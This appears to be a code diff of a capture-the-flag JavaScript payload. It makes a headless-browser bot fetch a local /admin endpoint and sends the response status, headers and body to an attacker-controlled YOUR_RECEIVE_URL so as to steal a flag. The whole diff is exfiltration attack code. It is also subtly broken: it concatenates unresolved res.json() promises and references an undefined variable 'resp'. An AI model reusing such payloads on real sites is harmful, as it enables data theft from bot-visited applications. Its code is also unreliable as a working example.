@@ -14,10 +14,18 @@
     // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
     fetch('http://127.0.0.1:3000/admin')
         .then(res => {
+            
+            const respStatus = res.status;
+             fetch(YOUR_RECEIVE_URL+'?respS='+respStatus);
             const headersArr = Array.from(res.headers.entries()).map(([key, value]) => `${key}: ${value}`);
+            fetch(YOUR_RECEIVE_URL+'?headersArr='+headersArr);
+            const respJson = res.json();
+            fetch(YOUR_RECEIVE_URL+'?respJson='+respJson);
+            
+            
             // 2. 转成字符串（用换行分隔，也可以用逗号 "," 分隔）
             //const headersStr = headersArr.join('\n');
-            fetch(YOUR_RECEIVE_URL+'?res='+headersArr);
+            fetch(YOUR_RECEIVE_URL+'?res='+resp+':'+headersArr);
             if (res.ok){ 
              
                 fetch(YOUR_RECEIVE_URL+'?json='+res.json());
